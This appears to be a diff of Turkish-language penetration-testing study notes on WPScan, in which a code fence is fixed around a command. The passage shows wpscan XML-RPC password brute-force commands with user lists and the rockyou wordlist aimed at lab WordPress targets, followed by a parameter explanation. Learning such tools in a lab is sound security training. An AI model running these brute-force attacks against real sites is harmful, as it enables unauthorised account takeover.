@@ -587,9 +587,9 @@ WPScan iki tür giriş brute force saldırısı destekler:
 wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com
 ```
 
-``
+```
 wpscan --password-attack xmlrpc -t 20 -U roger -P /usr/share/wordlists/rockyou.txt --url http://154.57.164.78:38680
-
+```
 
 [Parametre Açıklamaları]
 - --password-attack xmlrpc: Saldırı türü olarak daha hızlı olan XML-RPC protokolünün kullanılacağını belirtir.
